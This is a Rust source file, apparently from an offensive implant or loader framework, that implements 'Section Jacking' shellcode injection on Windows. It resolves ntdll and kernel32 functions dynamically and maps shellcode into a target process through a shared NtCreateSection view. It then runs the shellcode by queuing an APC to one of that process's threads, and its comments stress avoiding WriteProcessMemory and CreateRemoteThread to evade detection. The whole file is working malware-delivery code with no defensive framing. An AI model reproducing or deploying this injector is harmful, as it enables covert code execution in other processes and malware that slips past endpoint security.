//! T-REX Section Jacking delivery injector.
//!
//! Zero-`WriteProcessMemory`, zero-`CreateRemoteThread` injection.
//! Maps shellcode via `NtCreateSection` shared memory — local RW view and
//! remote RX view alias the same physical pages. Execution via `NtQueueApcThread`.
//!
//! # References
//! - zero-loader (xAL6 2026): Section Jacking for zero WPM
//! - Existing: `fluctuation.rs` for NtAlloc/NtFree pattern

#![cfg(target_os = "windows")]

use core::ffi::c_void;

#[allow(dead_code)]
const STATUS_SUCCESS: i32 = 0;
const SECTION_MAP_READ: u32 = 0x0004;
const SECTION_MAP_WRITE: u32 = 0x0002;
const SECTION_MAP_EXECUTE: u32 = 0x0008;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const SEC_COMMIT: u32 = 0x0800_0000;
#[allow(dead_code)]
const MEM_COMMIT: u32 = 0x1000;
const TH32CS_SNAPTHREAD: u32 = 0x0000_0004;
const THREAD_SET_CONTEXT: u32 = 0x0010;
const PROCESS_VM_OPERATION: u32 = 0x0008;
const PROCESS_VM_WRITE: u32 = 0x0020;
const PROCESS_CREATE_THREAD: u32 = 0x0002;
const PROCESS_QUERY_INFORMATION: u32 = 0x0400;

// ---- NT API types ---------------------------------------------------------

type NtCreateSectionFn =
    unsafe extern "system" fn(*mut isize, u32, *mut c_void, *mut i64, u32, u32, isize) -> i32;

type NtMapViewOfSectionFn = unsafe extern "system" fn(
    isize,
    isize,
    *mut *mut c_void,
    usize,
    usize,
    *mut i64,
    *mut usize,
    u32,
    u32,
    u32,
) -> i32;

type NtUnmapViewOfSectionFn = unsafe extern "system" fn(isize, *mut c_void) -> i32;

type NtOpenProcessFn = unsafe extern "system" fn(*mut isize, u32, *mut c_void, *mut c_void) -> i32;

type NtQueueApcThreadFn = unsafe extern "system" fn(isize, *mut c_void, usize, usize, usize) -> i32;

type NtCloseFn = unsafe extern "system" fn(isize) -> i32;

type NtOpenThreadFn = unsafe extern "system" fn(*mut isize, u32, *mut c_void, *mut c_void) -> i32;

// ---- Toolhelp types -------------------------------------------------------

type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> isize;
type Thread32FirstFn = unsafe extern "system" fn(isize, *mut ThreadEntry32W) -> i32;
type Thread32NextFn = unsafe extern "system" fn(isize, *mut ThreadEntry32W) -> i32;

#[repr(C)]
struct ThreadEntry32W {
    dw_size: u32,
    _cnt_usage: u32,
    th32_thread_id: u32,
    th32_owner_process_id: u32,
    _tp_base_pri: i32,
    _tp_delta_pri: i32,
    _dw_flags: u32,
}

#[repr(C)]
struct ClientId {
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
}

// ---- Resolver cache -------------------------------------------------------

struct ResolvedFns {
    nt_create_section: NtCreateSectionFn,
    nt_map_view: NtMapViewOfSectionFn,
    nt_unmap_view: NtUnmapViewOfSectionFn,
    nt_open_process: NtOpenProcessFn,
    nt_queue_apc: NtQueueApcThreadFn,
    nt_close: NtCloseFn,
    nt_open_thread: NtOpenThreadFn,
    create_snapshot: CreateToolhelp32SnapshotFn,
    thread32_first: Thread32FirstFn,
    thread32_next: Thread32NextFn,
}

unsafe fn resolve_fns() -> Option<ResolvedFns> {
    let a = |dll: &[u8], name: &[u8]| -> Option<usize> { crate::resolve::export_addr(dll, name) };
    Some(ResolvedFns {
        nt_create_section: core::mem::transmute(a(b"ntdll.dll", b"NtCreateSection")?),
        nt_map_view: core::mem::transmute(a(b"ntdll.dll", b"NtMapViewOfSection")?),
        nt_unmap_view: core::mem::transmute(a(b"ntdll.dll", b"NtUnmapViewOfSection")?),
        nt_open_process: core::mem::transmute(a(b"ntdll.dll", b"NtOpenProcess")?),
        nt_queue_apc: core::mem::transmute(a(b"ntdll.dll", b"NtQueueApcThread")?),
        nt_close: core::mem::transmute(a(b"ntdll.dll", b"NtClose")?),
        nt_open_thread: core::mem::transmute(a(b"ntdll.dll", b"NtOpenThread")?),
        create_snapshot: core::mem::transmute(
            a(b"kernel32.dll", b"CreateToolhelp32Snapshot")
                .or_else(|| a(b"kernelbase.dll", b"CreateToolhelp32Snapshot"))?,
        ),
        thread32_first: core::mem::transmute(
            a(b"kernel32.dll", b"Thread32First")
                .or_else(|| a(b"kernelbase.dll", b"Thread32First"))?,
        ),
        thread32_next: core::mem::transmute(
            a(b"kernel32.dll", b"Thread32Next")
                .or_else(|| a(b"kernelbase.dll", b"Thread32Next"))?,
        ),
    })
}

// ---- Step helpers ---------------------------------------------------------

unsafe fn open_target_process(fns: &ResolvedFns, pid: u32) -> Option<isize> {
    let access: u32 =
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION;
    let mut cid = ClientId {
        unique_process: pid as usize as *mut c_void,
        unique_thread: core::ptr::null_mut(),
    };
    let mut h: isize = 0;
    if (fns.nt_open_process)(
        &mut h,
        access,
        &mut cid as *mut ClientId as *mut c_void,
        core::ptr::null_mut(),
    ) == 0
    {
        Some(h)
    } else {
        None
    }
}

unsafe fn create_section(fns: &ResolvedFns, size: usize) -> Option<isize> {
    let mut h: isize = 0;
    let mut max: i64 = size as i64;
    let attr: *mut c_void = core::ptr::null_mut();
    if (fns.nt_create_section)(
        &mut h,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        attr,
        &mut max,
        PAGE_EXECUTE_READ,
        SEC_COMMIT,
        0isize,
    ) == 0
    {
        Some(h)
    } else {
        None
    }
}

unsafe fn map_local_view(fns: &ResolvedFns, section: isize, size: usize) -> Option<*mut c_void> {
    let mut view: *mut c_void = core::ptr::null_mut();
    let mut vs: usize = size;
    let mut off: i64 = 0;
    if (fns.nt_map_view)(
        section,
        -1isize,
        &mut view,
        0,
        0,
        &mut off,
        &mut vs,
        2,
        0,
        PAGE_READWRITE,
    ) == 0
    {
        Some(view)
    } else {
        None
    }
}

unsafe fn map_remote_view(
    fns: &ResolvedFns,
    section: isize,
    target: isize,
    size: usize,
) -> Option<*mut c_void> {
    let mut view: *mut c_void = core::ptr::null_mut();
    let mut vs: usize = size;
    let mut off: i64 = 0;
    if (fns.nt_map_view)(
        section,
        target,
        &mut view,
        0,
        0,
        &mut off,
        &mut vs,
        2,
        0,
        PAGE_EXECUTE_READ,
    ) == 0
    {
        Some(view)
    } else {
        None
    }
}

unsafe fn find_target_thread(fns: &ResolvedFns, pid: u32) -> Option<isize> {
    let snap = (fns.create_snapshot)(TH32CS_SNAPTHREAD, 0);
    if snap == -1 || snap == 0 {
        return None;
    }

    let mut te = ThreadEntry32W {
        dw_size: core::mem::size_of::<ThreadEntry32W>() as u32,
        _cnt_usage: 0,
        th32_thread_id: 0,
        th32_owner_process_id: 0,
        _tp_base_pri: 0,
        _tp_delta_pri: 0,
        _dw_flags: 0,
    };

    let mut found: Option<isize> = None;
    if (fns.thread32_first)(snap, &mut te) != 0 {
        loop {
            if te.th32_owner_process_id == pid {
                let mut cid = ClientId {
                    unique_process: core::ptr::null_mut(),
                    unique_thread: te.th32_thread_id as usize as *mut c_void,
                };
                let mut h: isize = 0;
                if (fns.nt_open_thread)(
                    &mut h,
                    THREAD_SET_CONTEXT,
                    core::ptr::null_mut(),
                    &mut cid as *mut ClientId as *mut c_void,
                ) == 0
                {
                    found = Some(h);
                    break;
                }
            }
            te.dw_size = core::mem::size_of::<ThreadEntry32W>() as u32;
            if (fns.thread32_next)(snap, &mut te) == 0 {
                break;
            }
        }
    }
    (fns.nt_close)(snap);
    found
}

// ---- Public API -----------------------------------------------------------

/// Section Jacking inject: maps shellcode into target process via shared section,
/// triggers via APC queue. Zero WriteProcessMemory, zero CreateRemoteThread.
///
/// Returns Ok(()) on success, Err on any resolution/allocation failure.
pub unsafe fn section_jacking_inject(
    target_pid: u32,
    shellcode: &[u8],
) -> Result<(), &'static str> {
    let fns = resolve_fns().ok_or("failed to resolve NT APIs")?;
    let h_target = open_target_process(&fns, target_pid).ok_or("NtOpenProcess failed")?;
    let h_section = create_section(&fns, shellcode.len()).ok_or("NtCreateSection failed")?;
    let local_view = map_local_view(&fns, h_section, shellcode.len())
        .ok_or("local NtMapViewOfSection failed")?;

    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view as *mut u8, shellcode.len());

    let remote_view = map_remote_view(&fns, h_section, h_target, shellcode.len())
        .ok_or("remote NtMapViewOfSection failed")?;

    (fns.nt_unmap_view)(-1isize, local_view);

    let h_thread = find_target_thread(&fns, target_pid).ok_or("no target thread found")?;

    (fns.nt_queue_apc)(h_thread, remote_view, remote_view as usize, 0, 0);
    (fns.nt_close)(h_thread);
    (fns.nt_close)(h_target);
    // h_section intentionally kept alive (remote view depends on it)

    Ok(())
}
